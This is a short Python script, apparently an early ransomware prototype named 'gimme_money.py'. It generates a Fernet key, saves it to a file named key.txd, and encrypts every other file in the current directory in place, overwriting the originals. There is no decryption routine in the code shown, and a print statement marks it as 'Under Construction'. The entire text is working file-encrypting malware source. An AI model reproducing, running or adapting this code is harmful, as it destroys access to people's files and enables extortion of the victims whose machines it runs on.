print("Under Construction...")
import os
from cryptography.fernet import Fernet

files= []

for file in os.listdir():
    if file == 'gimme_money.py' or file == 'key.txd':
        continue
    if os.path.isfile(file):
        files.append(file)

# print(files)

KEY = Fernet.generate_key()
# print(KEY)

with open("key.txd", "wb") as thekey:
    thekey.write(KEY)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    content_encr = Fernet(KEY).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(content_encr)
        